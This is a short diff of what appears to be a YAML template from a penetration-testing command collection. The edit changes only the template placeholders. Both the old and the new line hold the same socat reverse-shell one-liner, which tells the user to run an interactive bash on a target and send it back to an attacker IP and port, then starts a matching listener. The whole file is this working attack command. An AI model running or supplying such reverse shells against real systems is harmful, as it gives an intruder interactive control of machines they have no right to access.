@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  echo "On your target, enter: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/shell_port)%>"; bash -c "socat file:`tty`,raw,echo=0 tcp-listen:<%=$(esh variables/shell_port)%>"
+  echo "On your target, enter: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{ attacker_ip }}:{{ shell_port }}"; bash -c "socat file:`tty`,raw,echo=0 tcp-listen:{{ shell_port }}"
